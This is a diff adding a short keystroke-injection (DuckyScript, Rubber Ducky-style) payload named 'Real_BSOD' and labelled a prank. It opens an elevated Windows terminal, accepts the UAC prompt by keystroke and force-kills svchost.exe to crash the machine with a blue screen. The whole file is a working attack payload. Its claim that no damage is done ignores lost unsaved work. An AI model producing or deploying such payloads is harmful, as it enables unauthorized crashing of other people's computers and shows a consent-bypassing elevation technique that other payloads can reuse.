@@ -1,0 +1,16 @@
+REM Title: Real_BSOD
+REM Author: h1dd3n3y3
+REM Description: Script to trigger Windows BSOD. No hardware/software damage is done.
+REM Target: Windows 10/11
+REM Version: 1.0
+REM Category: Prank
+
+DELAY 500
+GUI X
+STRING A
+DELAY 300
+ALT Y
+ENTER
+DELAY 200
+STRING taskkill /IM svchost.exe /f
+ENTER
